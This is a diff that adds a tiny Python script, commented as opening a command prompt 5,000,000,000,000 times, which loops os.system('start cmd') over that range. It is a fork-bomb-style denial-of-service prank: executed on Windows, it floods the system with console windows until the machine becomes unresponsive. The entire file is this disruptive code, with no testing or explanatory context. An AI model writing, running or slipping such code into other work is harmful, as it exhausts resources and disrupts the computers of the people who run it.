@@ -1,1 +1,7 @@
 
+# Open CMD Prompt 5000000000000 Times
+
+import os
+
+for _ in range(5000000000000):
+    os.system('start cmd')
